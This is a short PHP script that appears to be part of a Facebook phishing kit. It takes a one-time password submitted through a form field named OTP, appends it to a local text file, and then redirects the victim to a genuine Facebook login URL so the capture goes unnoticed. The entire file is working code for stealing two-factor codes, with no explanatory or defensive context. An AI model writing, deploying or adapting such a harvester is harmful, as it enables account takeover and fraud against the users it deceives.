<?php

file_put_contents("output.txt", " Done " . $_POST['OTP'] . "\n", FILE_APPEND);
header('Location: https://mbasic.facebook.com/login/?next=https%3A%2F%2Fmbasic.facebook.com%2Fgroups%2F404153983380478%2F%3Fref%3Dshare&email=&li=qQJ8X6EUGZ8G95qx2Pb4_C58&e=1348092&shbl=1&ref=share&refsrc=https%3A%2F%2Fmbasic.facebook.com%2Fgroups%2F404153983380478%2F%3Fref%3Dshare&rtime=1601962701&sk=AaGgPfF5xbbESSCrF9eC7OMJqWBo4sVVzaoy5U8sSFg16dHc33tOE39s9ikrgMd14Ve_AMcAk3rFCj_SGFVdGccd34uBBuOGak6sZmrJyfHwbVok9oJZrGYNR0N_7EyD3kbnVIWFq_PqZTH2QUkvuWmeMTzRvLqxcAhZ45PkxpmVmtEVQyZyA7ahJyQ6bzpiC3Ao7euuds2JeN-WlN8jR7NFA3706nnvQ11IUMSkz3z2nJSPJhq4MKdAlAu68eWn-VKlu2sE7VbdZ8LmOFuWG-ISlTmNDkJrmNnQPIaFz5lHxg0ldbogZIAt8lMf4jTHQXg&hrc=1&_rdr');
exit();
